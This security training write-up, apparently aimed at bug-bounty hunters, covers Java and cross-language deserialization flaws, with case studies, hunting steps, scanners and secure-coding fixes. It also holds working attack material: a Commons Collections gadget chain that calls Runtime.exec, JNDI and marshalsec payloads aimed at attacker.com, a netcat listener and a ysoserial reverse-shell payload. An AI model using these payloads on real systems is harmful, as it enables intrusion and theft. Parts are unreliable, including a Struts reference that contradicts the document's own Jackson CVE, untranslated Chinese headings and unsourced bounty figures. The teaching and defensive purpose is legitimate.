# Case Study 17: Deserialization & Java Deserialization — Real-World Bug Bounty Findings

## Expert Role

Deserialization vulnerabilities represent one of the most severe and technically complex bug classes in modern application security. As a specialist in this domain, you must understand how applications convert serialized data back into usable objects, and how attackers can manipulate this process to achieve remote code execution, privilege escalation, or other severe impacts. The discipline spans multiple languages and serialization formats, with Java deserialization being particularly notorious for its exploitation complexity and widespread impact.

The expertise required encompasses understanding object-oriented programming principles, class hierarchies, reflection mechanisms, and the specific serialization implementations across different platforms. You need to master concepts like gadget chains, reflection-based exploitation, class loader manipulation, and the intricate ways different serialization libraries handle object reconstruction. Java deserialization vulnerabilities are especially challenging because exploitation often requires chaining multiple method calls across various library classes to achieve a desired outcome.

Your role includes both identifying vulnerable deserialization points and developing safe, controlled proof-of-concept demonstrations. You must be able to analyze complex class hierarchies to identify potential gadget chains, understand how different serialization libraries (Java native, Kryo, Jackson, etc.) handle object reconstruction, and assess the real-world impact based on the application's classpath and available gadgets. The ability to explain these complex technical concepts to both technical and non-technical stakeholders is essential.

## Overview

Deserialization vulnerabilities occur when an application converts untrusted serialized data back into objects without proper validation. The vulnerability arises when the deserialization process instantiates classes, invokes methods, or accesses properties based on attacker-controlled data embedded in the serialized payload.

Java deserialization vulnerabilities gained widespread attention in 2015-2016 with the discovery of universal gadget chains in common libraries like Apache Commons Collections. These chains allowed attackers to achieve remote code execution by chaining together method calls across seemingly innocuous classes present in most Java applications. The impact was severe because many organizations were unaware they included vulnerable libraries in their applications.

The serialization landscape extends beyond Java native serialization. Modern applications use various serialization frameworks including Jackson, Fastjson, Kryo, and Protocol Buffers. Each framework has its own attack surface and exploitation techniques. Understanding the differences between these frameworks and their specific vulnerabilities is crucial for comprehensive security testing.

The impact of deserialization vulnerabilities varies based on the application context and available classpath. The most severe impact is remote code execution through gadget chains that lead to command execution. Other impacts include privilege escalation, information disclosure, and denial of service. The complexity of exploitation often depends on the available classes in the application's classpath and the specific serialization library in use.

---

## Real-World Case Studies

### Case Study 1: Apache Commons Collections RCE (The "Deserialization Apocalypse")
**Program:** Multiple Companies (Responsible Disclosure)
**Bounty:** N/A (Industry-wide impact)
**Severity:** Critical (CVSS 10.0)
**Researchers:** Chris Frohoff (@frohoff), Gabriel Lawrence (@gebl)

**Vulnerability Description:**
The Apache Commons Collections library contained utility classes that could be chained together to achieve arbitrary code execution through Java native deserialization. The vulnerability affected thousands of Java applications worldwide that included this commonly-used library.

**Technical Details:**
```java
// Gadget chain overview (simplified)
// 1. ObjectInputStream.readObject() - Entry point
// 2. AnnotationInvocationHandler.readObject() - Reflection
// 3. LazyMap.get() - Trigger transformation
// 4. ChainedTransformer.transform() - Execute commands
// 5. Runtime.exec() - Execute system command

// Key classes in the gadget chain:
// - org.apache.commons.collections.Transformer
// - org.apache.commons.collections.functors.InvokerTransformer
// - org.apache.commons.collections.functors.ConstantTransformer
// - org.apache.commons.collections.map.LazyMap

// Simplified exploitation concept:
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", 
        new Class[] {String.class, Class[].class},
        new Object[] {"getRuntime", null}),
    new InvokerTransformer("invoke",
        new Class[] {Object.class, Object[].class},
        new Object[] {null, null}),
    new InvokerTransformer("exec",
        new Class[] {String.class},
        new Object[] {"echo test"})
};

// Chain creates a map that executes commands when accessed
Map innerMap = new HashMap();
Map transformedMap = LazyMap.decorate(innerMap, 
    new ChainedTransformer(transformers));

// Trigger: deserialization calls get() on the map
```

**Root Cause Analysis:**
The vulnerability existed because Commons Collections included transformer classes that could invoke arbitrary methods via reflection. These classes were designed for functional programming patterns but could be abused when chained together during deserialization. The `InvokerTransformer` class could call any method on any object, enabling attackers to chain calls to `Runtime.getRuntime().exec()`.

**Impact Assessment:**
- Affected virtually every Java application using Commons Collections
- Remote code execution without authentication
- Widely exploited in the wild before public disclosure
- Led to industry-wide vulnerability scanning and remediation

**Bounty Justification:**
While this was a responsible disclosure rather than a bug bounty report, the impact was severe enough to affect thousands of organizations. The vulnerability demonstrated the critical importance of dependency security and serialization validation.

---

### Case Study 2: WebLogic T3 Deserialization RCE (CVE-2018-2628)
**Program:** Oracle Critical Patch Update
**Bounty:** N/A (Oracle Security Alert)
**Severity:** Critical (CVSS 9.8)
**Researchers:** Various security researchers

**Vulnerability Description:**
Oracle WebLogic Server contained a deserialization vulnerability in the T3 protocol used for inter-server communication. The vulnerability allowed unauthenticated attackers to execute arbitrary code on the WebLogic server by sending malicious serialized objects through the T3 protocol.

**Technical Details:**
```java
// T3 Protocol deserialization vulnerability
// WebLogic uses T3 protocol for internal communication
// The T3 protocol deserializes objects without validation

// Simplified vulnerable code path:
public class T3Service {
    public void processMessage(T3Message message) {
        // Deserialize objects from T3 stream
        ObjectInputStream ois = new ObjectInputStream(
            message.getInputStream());
        
        // VULNERABLE: No validation of deserialized objects
        Object obj = ois.readObject();  // Triggers gadget chain
        
        // Process the deserialized object
        handleMessage(obj);
    }
}

// Exploitation requires:
// 1. Connect to WebLogic T3 port (default 7001)
// 2. Send malicious serialized object in T3 stream
// 3. Deserialization triggers gadget chain
// 4. Code execution on server
```

**Exploitation Chain:**
1. Establish T3 protocol connection to WebLogic server
2. Craft serialized object with malicious gadget chain
3. Send object through T3 protocol stream
4. WebLogic deserializes the object
5. Gadget chain executes, leading to code execution

**Root Cause Analysis:**
WebLogic's T3 protocol implementation deserialized incoming objects without validating the class types. The server trusted all serialized data received through the T3 protocol, assuming it came from other WebLogic servers. However, attackers could establish T3 connections and send arbitrary serialized payloads.

**Impact Assessment:**
- Unauthenticated remote code execution
- Affects WebLogic Server versions 10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3
- Public exploit code available
- Widely exploited in targeted attacks

---

### Case Study 3: JBoss JMXInvokerServlet Deserialization
**Program:** Red Hat Security (Responsible Disclosure)
**Bounty:** N/A (Responsible Disclosure)
**Severity:** Critical (CVSS 9.8)
**Researcher:** @gebl

**Vulnerability Description:**
JBoss Application Server exposed the JMXInvokerServlet endpoint that accepted serialized Java objects over HTTP without authentication. This allowed remote attackers to execute arbitrary code by sending specially crafted serialized payloads.

**Technical Details:**
```
POST /invoker/JMXInvokerServlet HTTP/1.1
Host: target:8080
Content-Type: application/x-java-serialized-object

[Serialized malicious object using Commons Collections gadget chain]
```

**Vulnerable Endpoint Analysis:**
```java
// JBoss exposes JMXInvokerServlet by default
// This servlet accepts serialized Java objects via HTTP POST
@WebServlet("/invoker/JMXInvokerServlet")
public class JMXInvokerServlet extends HttpServlet {
    
    protected void doPost(HttpServletRequest request, 
                         HttpServletResponse response) {
        
        // Read serialized object from request body
        ObjectInputStream ois = new ObjectInputStream(
            request.getInputStream());
        
        // VULNERABLE: Deserializes untrusted data
        Object obj = ois.readObject();
        
        // Process the object through JMX framework
        invokeOperation(obj);
    }
}
```

**Root Cause Analysis:**
JBoss exposed the JMXInvokerServlet as a default endpoint without authentication requirements. The endpoint was designed for remote JMX management but was accessible to anyone who could reach the HTTP port. The servlet deserialized incoming objects without validating the class types, allowing exploitation through common gadget chains.

**Exploitation Techniques:**
1. Identify exposed JMXInvokerServlet endpoint
2. Generate serialized payload with appropriate gadget chain
3. Send payload via HTTP POST request
4. Achieve remote code execution on the server

**Impact Assessment:**
- Unauthenticated remote code execution
- Default endpoint in many JBoss installations
- Public exploit tools available
- Frequently targeted in enterprise attacks

---

### Case Study 4: Apache Struts2 RCE (CVE-2017-5638)
**Program:** Apache Software Foundation
**Bounty:** N/A (Responsible Disclosure)
**Severity:** Critical (CVSS 10.0)
**Researchers:** Nike Zheng (@zicnax)

**Vulnerability Description:**
Apache Struts2 contained a remote code execution vulnerability in the Jakarta Multipart parser. The vulnerability was triggered when processing file uploads with malformed Content-Type headers, leading to OGNL expression injection and ultimately remote code execution.

**Technical Details:**
```
POST /upload.action HTTP/1.1
Host: target
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','test')}

[File upload data]
```

**Root Cause Analysis:**
The Jakarta Multipart parser in Struts2 incorrectly handled the Content-Type header value. When parsing the header, it passed the value directly to OGNL (Object-Graph Navigation Language) expression evaluation without proper sanitization. This allowed attackers to inject arbitrary OGNL expressions that would be executed by the server.

**OGNL Expression Injection:**
```java
// Vulnerable code path in Struts2
public class JakartaMultipartRequestExecutor {
    public void parseRequest(HttpServletRequest request) {
        String contentType = request.getContentType();
        
        // VULNERABLE: Direct OGNL evaluation of Content-Type
        Object value = Ognl.getValue(contentType, context);
        
        // Process the evaluated value
    }
}

// OGNL expression for RCE:
// #context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']
// leads to response header manipulation
// Further expressions can access Runtime.exec()
```

**Impact Assessment:**
- Remote code execution without authentication
- Affected thousands of Struts2 installations worldwide
- Notably used in the Equifax breach (2017)
- Ongoing exploitation due to slow patching

---

### Case Study 5: Jackson Deserialization RCE (CVE-2017-7525)
**Program:** FasterXML (Responsible Disclosure)
**Bounty:** N/A (Responsible Disclosure)
**Severity:** Critical (CVSS 9.8)
**Researcher:** @cowtowncoder

**Vulnerability Description:**
The Jackson JSON library contained a deserialization vulnerability that allowed remote code execution when processing untrusted JSON input. The vulnerability existed in Jackson's ability to instantiate arbitrary classes during deserialization, enabling exploitation through gadget chains similar to Java native deserialization.

**Technical Details:**
```json
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://attacker.com/exploit",
    "autoCommit": true
}
```

**Root Cause Analysis:**
Jackson's polymorphic deserialization feature allowed specifying the target class using the `@type` property. The library did not restrict which classes could be instantiated, allowing attackers to specify classes with dangerous side effects. The `JdbcRowSetImpl` class, when its `setDataSourceName` and `setAutoCommit` methods were called, would attempt to establish a JNDI connection, leading to remote code execution through JNDI injection.

**Exploitation Chain:**
1. Attacker crafts JSON with `@type` specifying `JdbcRowSetImpl`
2. Jackson deserializes the object and calls setter methods
3. `setDataSourceName` sets the JNDI data source URL
4. `setAutoCommit` triggers JNDI lookup
5. JNDI lookup contacts attacker-controlled server
6. Malicious object returned and instantiated, achieving RCE

**Impact Assessment:**
- Remote code execution through JSON deserialization
- Affects applications using Jackson with default settings
- Required enabling polymorphic deserialization feature
- Led to Jackson implementing default type blacklisting

---

## Pattern Recognition

### Common Vulnerability Patterns

| Pattern | Frequency | Avg Bounty | Root Cause |
|---------|-----------|------------|------------|
| Java native deserialization | Medium | $25,000-$100,000 | Unvalidated deserialization |
| Jackson polymorphic | Low | $15,000-$50,000 | Unsafe type handling |
| Fastjson autoType | Low | $10,000-$40,000 | Unrestricted class instantiation |
| YAML deserialization | Low | $10,000-$30,000 | Unsafe YAML parsing |
| Python pickle | Low | $5,000-$25,000 | Arbitrary code execution |
| PHP unserialize | Low | $5,000-$20,000 | Object injection |
| .NET BinaryFormatter | Very Low | $10,000-$40,000 | Unsafe deserialization |

### Attack Surface Locations

**Network Services:**
- RMI endpoints (Java Remote Method Invocation)
- JMX services (Java Management Extensions)
- T3 protocol (WebLogic)
- IIOP/CSIOP (CORBA implementations)
- Custom TCP protocols using Java serialization

**Web Endpoints:**
- REST APIs accepting serialized objects
- File upload handlers processing serialized data
- Session persistence mechanisms
- Cache implementations storing serialized objects
- Message queue consumers

**Configuration Sources:**
- YAML configuration files
- XML configuration with entity expansion
- Properties files with class instantiation
- JSON configuration with polymorphic types

---

## Hunting Methodology

### Step 1: Identify Serialization Entry Points

Map all potential deserialization points:

```
Network Indicators:
- RMI service ports (1099, 1199, random)
- JMX ports (9999, 9990, random)
- T3 protocol (7001, 7002)
- Custom ports running Java applications

HTTP Indicators:
- POST endpoints accepting application/x-java-serialized-object
- File upload endpoints
- Endpoints with "serialize" or "object" in name
- Session cookies containing serialized data
```

### Step 2: Fingerprint Serialization Libraries

Identify which serialization frameworks are in use:

```java
// Detection through error messages
// Send invalid serialized data and analyze error responses

// Java native serialization
// Error: java.io.InvalidClassException

// Jackson
// Error: com.fasterxml.jackson.databind.JsonMappingException

// Fastjson
// Error: com.alibaba.fastjson.JSONException

// Kryo
// Error: com.esotericsoftware.kryo.KryoException
```

### Step 3: Analyze Available Gadgets

Determine which classes are available for gadget chains:

```bash
# Scan application classpath for known gadget classes
jar tf application.war | grep -E "(commons-collections|spring-beans|commons-beanutils)"

# Check library versions
unzip -l application.war | grep -i "commons-collections"

# Use ysoserial to test available gadgets
java -jar ysoserial.jar CommonsCollections1 "echo test" > payload.bin
```

### Step 4: Generate and Test Payloads

Create proof-of-concept payloads:

```bash
# Generate gadget chain payload
java -jar ysoserial.jar [GadgetChain] "[Command]"

# Test with netcat listener
nc -lvp 4444

# Send payload to target
curl -X POST http://target/endpoint \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.bin
```

### Step 5: Validate and Document

Confirm the vulnerability and document findings:

```
Documentation Requirements:
1. Proof-of-concept payload (sanitized)
2. Request/response evidence
3. Gadget chain analysis
4. Available mitigation assessment
5. Impact analysis based on classpath
```

---

## Detection Strategies

### Automated Detection

**Deserialization Scanner:**
```python
import struct
import requests

JAVA_MAGIC = b'\xac\xed\x00\x05'  # Java serialization magic bytes

def detect_deserialization_endpoints(base_url):
    endpoints = [
        '/invoker/JMXInvokerServlet',
        '/invoker/EJBInvokerServlet',
        '/jmx-console/HtmlAdaptor',
        '/weblogic/invoker',
    ]
    
    findings = []
    for endpoint in endpoints:
        try:
            response = requests.post(
                f"{base_url}{endpoint}",
                data=JAVA_MAGIC + b'\x00' * 100,
                timeout=5
            )
            if response.status_code != 404:
                findings.append({
                    'endpoint': endpoint,
                    'status': response.status_code,
                    'potential_vuln': True
                })
        except requests.exceptions.RequestException:
            continue
    
    return findings
```

**YAML/JSON Deserialization Scanner:**
```python
PAYLOADS = {
    'jackson': '{"@type":"java.lang.String","val":"test"}',
    'fastjson': '{"@type":"java.lang.String"}',
    'snakeyaml': '!!java.lang.String "test"',
}

def scan_deserialization(base_url, endpoints):
    findings = []
    for endpoint in endpoints:
        for fmt, payload in PAYLOADS.items():
            try:
                response = requests.post(
                    f"{base_url}{endpoint}",
                    data=payload,
                    headers={'Content-Type': 'application/json'}
                )
                if response.status_code == 200:
                    findings.append({
                        'endpoint': endpoint,
                        'format': fmt,
                        'status': 'potential'
                    })
            except Exception:
                continue
    return findings
```

### Manual Detection

**Testing Methodology:**

1. **Error-Based Detection**
   - Send malformed serialized data
   - Analyze error messages for class names
   - Identify serialization library versions

2. **Side-Channel Detection**
   - Send payloads that trigger DNS lookups
   - Monitor for outbound connection attempts
   - Use blind injection techniques

3. **Time-Based Detection**
   - Send payloads that cause delays
   - Measure response time differences
   - Confirm execution through timing

### Key Detection Indicators

| Indicator | Severity | Action |
|-----------|----------|--------|
| Java serialization accepted | High | Test gadget chains |
| Jackson polymorphic enabled | High | Test type confusion |
| Fastjson autoType enabled | High | Test JNDI injection |
| YAML deserialization | High | Test code execution |
| No input validation | Critical | Immediate testing |

---

## Impact Assessment

### CVSS 3.1 Scoring

**Deserialization CVSS Components:**

- **Attack Vector (AV):** Network for remote exploitation
- **Attack Complexity (AC):** High (requires gadget chain), Low (if known chain exists)
- **Privileges Required (PR):** None for unauthenticated, Low for authenticated
- **User Interaction (UI):** None for server-side, Required for client-side
- **Scope (S):** Changed when affecting different security context
- **Confidentiality (C):** High for RCE
- **Integrity (I):** High for RCE
- **Availability (A):** High for RCE

### Business Impact

Deserialization vulnerabilities have severe business impact:

1. **Remote Code Execution:** Complete system compromise
2. **Lateral Movement:** Access to internal network
3. **Data Breach:** Access to all application data
4. **Supply Chain Risk:** Affects all systems using vulnerable libraries
5. **Compliance Violations:** Major regulatory implications

### Bounty Range

| Vulnerability Type | Typical Range | Factors |
|-------------------|---------------|---------|
| Java native deserialization RCE | $25,000-$100,000 | Authentication, gadget availability |
| Jackson/Fastjson RCE | $15,000-$50,000 | Configuration requirements |
| YAML deserialization | $10,000-$30,000 | Parser version, features enabled |
| Information disclosure | $5,000-$25,000 | Data sensitivity |

---

## Advanced Variations

### Variation 1: Alternative Gadget Chains

Beyond Commons Collections, numerous other gadget chains exist:

**Spring Framework Chains:**
- Spring-beans:利用 Spring 的属性绑定机制
- Spring-aop: 通过 AOP 代理实现代码执行
- Spring-tx: 事务管理器滥用

**Hibernate Chains:**
- 利用 Hibernate 的延迟加载机制
- 通过代理对象触发数据库操作

**Custom Application Chains:**
- 发现应用特有的类实现危险方法调用

### Variation 2: Cross-Language Deserialization

Deserialization vulnerabilities exist across multiple languages:

**Python Pickle:**
```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('echo test',))

payload = pickle.dumps(Exploit())
```

**Ruby Marshal:**
```ruby
# Malicious serialized object
payload = "\x04\x08I\"\x0cecho test\x06:\x06ET"
```

**PHP Unserialize:**
```php
class Logger {
    public $logFile;
    public $content;
    
    function __destruct() {
        file_put_contents($this->logFile, $this->content);
    }
}
```

### Variation 3: JNDI Injection via Deserialization

Using deserialization to trigger JNDI lookups:

```java
// JNDI injection through deserialization
// 1. Deserialize object triggers JNDI lookup
// 2. JNDI contacts attacker-controlled server
// 3. Malicious object returned and instantiated
// 4. Code execution achieved

// Common JNDI vectors:
// - javax.naming.InitialContext.lookup()
// - com.sun.rowset.JdbcRowSetImpl.setDataSourceName()
// - org.apache.xbean.propertyeditor.JndiConverter
```

### Variation 4: Deserialization into Existing Gadgets

Using application-specific classes for exploitation:

```
Approach:
1. Map all classes in application classpath
2. Identify classes with interesting methods
3. Chain method calls through setter/getter patterns
4. Construct gadget chain from application classes
5. Achieve code execution without dependency on common libraries
```

---

## Chain Integration

**Chain 1: Deserialization → RCE → Lateral Movement**
Achieve initial code execution through deserialization, then pivot to internal network.

**Chain 2: Information Leak → Deserialization → Data Breach**
Use information disclosure to identify serialization endpoints, then exploit for data access.

**Chain 3: Deserialization → Privilege Escalation → Admin Access**
Escalate privileges through deserialization, then access administrative functions.

**Chain 4: Deserialization → Persistence → Long-term Access**
Establish persistent access through deserialization exploitation.

---

## Prevention Recommendations

1. **Input Validation:** Never deserialize untrusted data
2. **Allowlisting:** If deserialization is necessary, use class allowlisting
3. **Serialization Libraries:** Use safe serialization formats (JSON, Protocol Buffers)
4. **Network Segmentation:** Isolate services using deserialization
5. **Monitoring:** Implement deserialization monitoring and alerting
6. **Updates:** Keep all serialization libraries updated
7. **Code Review:** Focus review on deserialization code paths
8. **Security Testing:** Include deserialization testing in security assessments

---

## Common Pitfalls

1. **Assuming Library Safety:** Even "safe" libraries can have vulnerabilities
2. **Incomplete Patching:** Patching one endpoint but missing others
3. **Missing Dependencies:** Not updating transitive dependencies
4. **Configuration Errors:** Leaving unsafe features enabled
5. **Insufficient Testing:** Not testing all deserialization points
6. **Ignoring Information Leaks:** Not using information disclosure to identify attack surface

---

## Real-World References

1. Apache Commons Collections CVE-2015-6420
2. Oracle WebLogic CVE-2018-2628
3. Apache Struts CVE-2017-7525
4. ysoserial: https://github.com/frohoff/ysoserial
5. Marshalsec: https://github.com/mbechler/marshalsec
6. OWASP Deserialization Cheat Sheet

---

## Quick Reference Cheat Sheet

**Immediate Report Items:**
- RMI/JMX endpoints without authentication
- T3 protocol accessible without authentication
- HTTP endpoints accepting serialized objects
- JNDI injection through deserialization
- File upload handlers processing serialized data

**Essential Tools:**
```bash
# ysoserial - Java deserialization payload generator
java -jar ysoserial.jar [GadgetChain] "[Command]"

# jndi-exploitation toolkit
java -jar JNDIExploit.jar [IP] [Port]

# Burp extensions
- Java Deserialization Scanner
- ysoserial

# Detection
nmap --script=java-rmi -p 1099 target
nmap --script=weblogic -p 7001 target
```

**Payload Generation:**
```bash
# Generate basic payload
java -jar ysoserial.jar CommonsCollections1 "echo test" > payload.bin

# Base64 encode for HTTP
base64 payload.bin > payload.b64

# Generate reverse connection payload
java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,base64_encoded_command}|{base64,-d}|{bash,-i}"
```

**Testing Checklist:**
- [ ] Identified all deserialization entry points
- [ ] Fingerprinted serialization libraries
- [ ] Analyzed available gadget classes
- [ ] Generated proof-of-concept payload
- [ ] Confirmed vulnerability (safely)
- [ ] Documented impact and remediation


---

## Appendix: Deserialization Attack Tools

### ysoserial Usage Guide

```bash
# List available gadget chains
java -jar ysoserial.jar

# Generate payload with specific gadget chain
java -jar ysoserial.jar CommonsCollections1 "echo test"

# Common gadget chains and their library dependencies

# CommonsCollections1-7
# Requires: Apache Commons Collections 3.x-4.0
# Dependency: commons-collections:commons-collections

# CommonsBeanutils1
# Requires: Apache Commons BeanUtils
# Dependency: commons-beanutils:commons-beanutils

# Spring1/2
# Requires: Spring Framework
# Dependency: spring-core, spring-beans

# Hibernate1/2
# Requires: Hibernate ORM
# Dependency: hibernate-core

# Jdk7u21
# Requires: JDK 7u21 and earlier
# No additional dependencies

# JRMPClient/JRMPListener
# Requires: JDK
# Uses Java Remote Method Protocol

# Payload generation examples
java -jar ysoserial.jar CommonsCollections1 "echo test" > payload.bin
java -jar ysoserial.jar Spring1 "echo test" > payload.bin
java -jar ysoserial.jar Hibernate1 "echo test" > payload.bin

# Base64 encoding for HTTP
java -jar ysoserial.jar CommonsCollections1 "echo test" | base64

# Custom classpath gadgets
java -jar ysoserial.jar -- gadget-name "command" /path/to/classpath
```

### JNDI Exploitation Framework

```bash
# Start JNDI exploitation server
java -jar JNDIExploit.jar [IP] [Port]

# Common JNDI vectors
ldap://attacker.com/obj
rmi://attacker.com/obj
dns://attacker.com/obj
iiop://attacker.com/obj
corba://attacker.com/obj

# LDAP server for JNDI injection
java -jar marshalsec.jar ldap://attacker.com #[Class]

# Example JNDI payloads
# Basic JNDI lookup
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/exploit","autoCommit":true}

# Spring JNDI
{"@type":"org.springframework.jndi.JndiTemplate","contextFactory":"org.springframework.jndi.rmi.RemoteContextFactory","jndiName":"rmi://attacker.com/exploit"}
```

### Marshalsec for Java Deserialization

```bash
# Start marshalsec HTTP server
java -jar marshalsec.jar [Marshaller] [Binding] [Codebase URL]

# Supported marshallers
# Jackson
java -jar marshalsec.jar Jackson json http://attacker.com/

# Fastjson
java -jar marshalsec.jar Fastjson json http://attacker.com/

# Spring
java -jar marshalsec.jar Spring json http://attacker.com/

# Hibernate
java -jar marshalsec.jar Hibernate json http://attacker.com/

# Example exploitation flow
# 1. Start HTTP server with malicious class
# 2. Start LDAP/RMI server pointing to HTTP server
# 3. Send payload to target with JNDI reference
# 4. Target fetches and executes malicious class
```

### Custom Gadget Chain Discovery Script

```python
#!/usr/bin/env python3
"""
Gadget Chain Discovery Tool
Analyzes Java classpath for potential gadget chains
"""

import zipfile
import os
import re
from collections import defaultdict

class GadgetChainFinder:
    def __init__(self, jar_path):
        self.jar_path = jar_path
        self.classes = []
        self.potential_gadgets = defaultdict(list)
        
        # Known dangerous method patterns
        self.dangerous_methods = {
            'exec': ['Runtime', 'ProcessBuilder', 'Command'],
            'invoke': ['Method', 'InvocationHandler', 'Proxy'],
            'lookup': ['JNDI', 'InitialContext', 'Naming'],
            'readObject': ['readObject', 'readResolve'],
            'transform': ['Transformer', 'invoke'],
            'setProperty': ['setProperty', 'put'],
        }
    
    def extract_classes(self):
        """Extract class names from JAR file"""
        with zipfile.ZipFile(self.jar_path, 'r') as jar:
            for entry in jar.namelist():
                if entry.endswith('.class'):
                    class_name = entry.replace('/', '.').replace('.class', '')
                    self.classes.append(class_name)
    
    def analyze_class(self, class_name):
        """Analyze a class for potential gadget methods"""
        # Simplified analysis - real implementation would decompile bytecode
        findings = []
        
        # Check for dangerous method patterns
        for method_type, keywords in self.dangerous_methods.items():
            for keyword in keywords:
                if keyword.lower() in class_name.lower():
                    findings.append({
                        'class': class_name,
                        'method_type': method_type,
                        'keyword': keyword
                    })
        
        return findings
    
    def find_potential_chains(self):
        """Find classes that could form gadget chains"""
        for class_name in self.classes:
            analysis = self.analyze_class(class_name)
            for finding in analysis:
                self.potential_gadgets[finding['method_type']].append(finding)
        
        return dict(self.potential_gadgets)
    
    def generate_report(self):
        """Generate analysis report"""
        chains = self.find_potential_chains()
        
        report = {
            'jar_file': self.jar_path,
            'total_classes': len(self.classes),
            'potential_gadgets': {
                method_type: len(gadgets) 
                for method_type, gadgets in chains.items()
            },
            'details': chains
        }
        
        return report

# Example usage
if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1:
        finder = GadgetChainFinder(sys.argv[1])
        finder.extract_classes()
        report = finder.generate_report()
        import json
        print(json.dumps(report, indent=2))
```

## Appendix: Secure Deserialization Implementation

### Java Deserialization Filter (JEP 290)

```java
import java.io.ObjectInputStream;
import java.io.ObjectInputFilter;

public class SecureDeserialization {
    
    // Define allowed classes
    private static final String ALLOWED_CLASSES = 
        "com.example.MyClass;com.example.MyOtherClass";
    
    public static ObjectInputStream createSecureInputStream(InputStream is) {
        ObjectInputStream ois = new ObjectInputStream(is);
        
        // Set deserialization filter
        ObjectInputFilter filter = ObjectInputFilter.Config
            .createFilter(ALLOWED_CLASSES);
        
        ois.setObjectInputFilter(filter);
        
        return ois;
    }
    
    // Custom filter implementation
    public static class CustomFilter implements ObjectInputFilter {
        private final long MAX_ARRAY_SIZE = 1024 * 1024; // 1MB
        private final int MAX_DEPTH = 10;
        
        @Override
        public Status checkObject(ObjectInputFilter.FilterInfo filterInfo) {
            // Check array size
            if (filterInfo.arrayLength() > MAX_ARRAY_SIZE) {
                return Status.REJECTED;
            }
            
            // Check class depth
            if (filterInfo.depth() > MAX_DEPTH) {
                return Status.REJECTED;
            }
            
            // Check allowed classes
            String className = filterInfo.serialClass() != null 
                ? filterInfo.serialClass().getName() 
                : null;
            
            if (className != null && !isClassAllowed(className)) {
                return Status.REJECTED;
            }
            
            return Status.ALLOWED;
        }
        
        private boolean isClassAllowed(String className) {
            // Implement class allowlisting logic
            return className.startsWith("com.example.");
        }
    }
}
```

### Jackson Secure Configuration

```java
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator;
import com.fasterxml.jackson.databind.jsontype.PolymorphicTypeValidator;

public class SecureJacksonConfig {
    
    public static ObjectMapper createSecureMapper() {
        // Create type validator
        PolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
            .allowIfBaseType(Object.class)
            .allowIfSubType("com.example.")
            .allowIfSubType("java.lang.")
            .build();
        
        ObjectMapper mapper = new ObjectMapper();
        
        // Enable polymorphic type handling with validator
        mapper.activateDefaultTyping(
            ptv,
            ObjectMapper.DefaultTyping.NON_FINAL
        );
        
        return mapper;
    }
    
    // Alternative: Use @JsonTypeInfo with explicit allow list
    @JsonTypeInfo(
        use = JsonTypeInfo.Id.CLASS,
        include = JsonTypeInfo.As.PROPERTY,
        property = "@class"
    )
    @JsonSubTypes({
        @JsonSubTypes.Type(value = SafeClass1.class),
        @JsonSubTypes.Type(value = SafeClass2.class)
    })
    public static class PolymorphicBase {
        // Only explicitly listed types allowed
    }
}
```

### Python Pickle Safety Wrapper

```python
import pickle
import io
import sys

class SafeUnpickler(pickle.Unpickler):
    """Safe unpickler that restricts allowed classes"""
    
    ALLOWED_CLASSES = {
        ('builtins', 'set'),
        ('builtins', 'frozenset'),
        ('builtins', 'dict'),
        ('builtins', 'list'),
        ('builtins', 'tuple'),
        ('datetime', 'datetime'),
        ('datetime', 'date'),
    }
    
    def find_class(self, module, name):
        if (module, name) not in self.ALLOWED_CLASSES:
            raise pickle.UnpicklingError(
                f"Class {module}.{name} is not allowed"
            )
        return super().find_class(module, name)


def safe_loads(data):
    """Safely deserialize pickle data"""
    try:
        return SafeUnpickler(io.BytesIO(data)).load()
    except pickle.UnpicklingError as e:
        raise ValueError(f"Unsafe deserialization: {e}")


def safe_load(file_path):
    """Safely load pickle from file"""
    with open(file_path, 'rb') as f:
        return safe_loads(f.read())


# Usage
if __name__ == '__main__':
    # This will raise an error for unsafe classes
    try:
        data = safe_load('data.pkl')
        print("Safe deserialization successful")
    except ValueError as e:
        print(f"Blocked unsafe deserialization: {e}")
```

### YAML Safe Loading (Python)

```python
import yaml
import json

class SafeYAMLLoader(yaml.SafeLoader):
    """Custom safe YAML loader"""
    
    # Override to disable dangerous constructors
    pass

def safe_yaml_load(yaml_string):
    """Safely load YAML without code execution"""
    try:
        return yaml.load(yaml_string, Loader=SafeYAMLLoader)
    except yaml.YAMLError as e:
        raise ValueError(f"YAML parsing error: {e}")


# Example usage
yaml_content = """
name: test
version: 1.0
data:
  - item1
  - item2
"""

# Safe loading
data = safe_yaml_load(yaml_content)
print(json.dumps(data, indent=2))

# Dangerous YAML that will be blocked
dangerous_yaml = """
!!python/object/apply:os.system
- echo "This should not execute"
"""

try:
    safe_yaml_load(dangerous_yaml)
except ValueError as e:
    print(f"Blocked: {e}")
```

## Appendix: Vulnerability Report Template

### Deserialization Vulnerability Report

```markdown
**Title:** [Platform] Remote Code Execution via [Serialization Format] Deserialization

**Summary:**
[Platform] is vulnerable to remote code execution through unsafe deserialization of [format] data. An attacker can execute arbitrary commands on the server by sending specially crafted serialized objects.

**Vulnerability Details:**
- **Endpoint:** [URL/Endpoint]
- **Serialization Format:** [Java/Jackson/Fastjson/YAML]
- **Gadget Chain:** [Chain name if applicable]
- **Authentication Required:** [Yes/No]

**Technical Description:**
[Detailed technical explanation of the vulnerability]

**Proof of Concept:**
[Sanitized proof of concept demonstrating the vulnerability]

**Exploitation Steps:**
1. [Step 1]
2. [Step 2]
3. [Step 3]

**Impact:**
- Remote code execution on the server
- Complete system compromise
- Data breach potential
- Lateral movement capability

**CVSS 3.1 Score:** [Score] ([Severity])

**Remediation:**
1. [Immediate mitigation]
2. [Long-term fix]
3. [Additional security measures]

**References:**
- [CVE if applicable]
- [Related advisories]
- [OWASP references]
```

